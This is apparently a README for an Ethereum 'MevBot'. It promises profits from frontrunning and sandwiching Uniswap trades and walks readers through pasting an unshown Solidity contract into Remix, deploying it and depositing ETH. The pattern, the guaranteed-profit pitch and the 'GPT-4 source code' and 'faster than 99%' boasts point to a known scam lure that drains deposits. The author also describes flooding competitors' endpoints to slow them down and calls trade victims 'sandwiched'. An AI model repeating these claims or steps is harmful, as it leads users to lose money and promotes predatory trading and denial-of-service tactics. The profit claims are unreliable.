# MevBot

My development is licensed. All rights reserved by the "APE" team (Apeboting/MevBot)
--------------
This screenshots are for informative purposes of our copyrights!
------------
![VodianoyZnak (1)](https://user-images.githubusercontent.com/131911477/235360990-7b1de85a-a789-4de7-b848-9994009eb6fa.png)

Make money with MEV-bot (GPT-4 source code) (audit contract)
--------

Update 30.04.2022
------
The contract is optimized. now the "start" and "withdraw" functions require less gas.
---------

The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

Bot sends the Transaction and sniffs the Uniswap v2 Mempool

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

Sending back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

But ser, there are open source bots that do the same

Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

Wen increase aggressiveness ?

As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

Personal journey in this

What did I learn?

MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap

So why stop?

I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end I kept getting outcompeted by this individual:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

But I will give you some competition.(ㆆ_ㆆ)

MEV bot Instructions
-------



(works only for Mainnet)
How it works:
----

create-a-frontrunner-bot-on-uniswap

You can see an example of how the bot works.
![0](https://user-images.githubusercontent.com/131911477/235358828-cb2b6c52-d2a4-472e-8dca-7b1b41379d4d.png)


The bot will make transactions on your entire balance to increase profit
![exemple 4](https://user-images.githubusercontent.com/131911477/235358835-d417dcbb-0e96-4237-aecc-05bac2e81936.png)
![exemple5 (1)](https://user-images.githubusercontent.com/131911477/235359047-9ca34ed4-a762-4735-b35a-eaede159c77f.png)




First-source code
-----
Access the Remix IDE  https://remix.ethereum.org/ 
-----------
FILE EXPLORER
---------
 and click and create new file "MevBot.sol"
Copy code and paste in Remix IDE

![1](https://user-images.githubusercontent.com/131911477/235358848-d58d3c89-4039-4ff4-8072-a8fcd0261380.png)


Click Solidity complier 0.6.6
------

And press Compile Mev Bot.sol

![2](https://user-images.githubusercontent.com/131911477/235358850-5293f561-0803-4a53-a594-b8dce684c7e1.png)


Select ETH or BSC(BNB) network
-----

and router address

Press Transact (Deploy)
-----
![3](https://user-images.githubusercontent.com/131911477/235358855-e4b0c076-b01c-4ec7-8ad7-744a709bcdbe.png)



Next-deposit (balans Mev Bot)
------

Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button


![4](https://user-images.githubusercontent.com/131911477/235358872-c5484318-b71d-4069-91da-fd4c3b2e4cf5.png)

![4 1](https://user-images.githubusercontent.com/131911477/235358862-229cac84-2151-4248-994d-3c84e961adc9.png)

![5](https://user-images.githubusercontent.com/131911477/235358874-b49e89da-2206-4132-b1cf-6f154f6d0cb0.png)





Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.2-1
----

At any time you can Stop bot or return your money by calling the withdrawal function.
-----
